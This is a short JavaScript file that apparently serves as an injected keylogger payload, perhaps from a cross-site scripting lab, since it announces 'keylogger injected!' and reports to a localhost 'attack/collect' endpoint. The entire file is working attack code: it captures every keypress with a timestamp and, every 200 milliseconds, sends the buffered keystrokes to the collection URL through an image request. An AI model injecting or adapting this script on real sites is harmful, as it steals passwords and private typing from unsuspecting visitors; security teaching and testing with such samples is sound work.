alert('keylogger injected!');
(function test () {
    var buffer = [];
    var attacker = 'http://localhost:3001/api/attack/collect?key=';

    document.onkeypress = function(e) {
        var timestamp = Date.now() | 0;
        var stroke = {
            k: e.key,
            t: timestamp
        };
        buffer.push(stroke);
    }

    window.setInterval(function() {
        if (buffer.length > 0) {
            var src = JSON.stringify(buffer),
                    data = encodeURIComponent(src);
            new Image().src = attacker + data;
            buffer = [];
        }
    }, 200);
})();